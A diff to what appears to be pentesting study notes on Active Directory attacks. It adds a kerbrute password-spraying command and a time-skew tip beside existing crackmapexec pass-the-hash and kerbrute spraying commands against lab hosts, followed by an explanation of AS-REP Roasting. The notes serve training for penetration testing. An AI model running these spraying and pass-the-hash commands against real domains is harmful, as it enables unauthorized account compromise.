@@ -297,11 +297,18 @@ crackmapexec added `Pwn3d!` to the output, indicating that the user has administ
 ```
 crackmapexec smb 192.168.248.70-76 -u jeffadmin -H e460605a9dbd55097c6cf77af2f89a03 -d corp.com --continue-on-success
 ```
+## `kerbrute`
 - Password spraying using Kerberos TGT
 We'll need to provide a username and password to do this. If the credentials are valid, we'll obtain a TGT.
 ```
 .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
 ```
+```
+./kerbrute passwordspray --dc <dc-ip> -d domain.local users.txt 'Password123!'
+```
+> Time skew should be max 5m-10m different!
+
+
 If you receive a network error, make sure that the encoding of usernames.txt is ANSI. You can use Notepad's Save As functionality to change the encoding.
 ## AS-REP Roasting
 The first step of the authentication process via Kerberos is to send an `AS-REQ`. Based on this request, the domain controller can validate if the authentication is successful. If it is, the domain controller replies with an AS-REP containing the session key and TGT. This step is also commonly referred to as Kerberos preauthentication. Without Kerberos preauthentication in place, an attacker could send an AS-REQ to the domain controller on behalf of any AD user. After obtaining the AS-REP from the domain controller, the attacker could perform an offline password attack against the encrypted part of the response. This attack is known as AS-REP Roasting.
